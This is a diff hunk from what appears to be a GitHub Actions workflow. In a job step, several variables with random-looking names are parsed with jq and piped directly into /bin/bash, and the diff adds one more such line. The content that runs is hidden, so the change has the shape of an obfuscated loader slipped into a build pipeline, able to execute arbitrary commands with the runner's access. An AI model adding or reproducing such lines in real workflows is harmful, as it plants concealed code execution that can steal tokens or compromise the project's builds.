@@ -25,6 +25,7 @@ jobs:
           echo $mdg860 | jq -r .v1 | /bin/bash
           printf '%s' "$tpeaa166" | jq -r .b19 | /bin/bash
           printf '%s' "$rwoh661" | jq -r .ejcrl09265 | /bin/bash
+          printf '%s' "$cf8" | jq -r .lao308 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
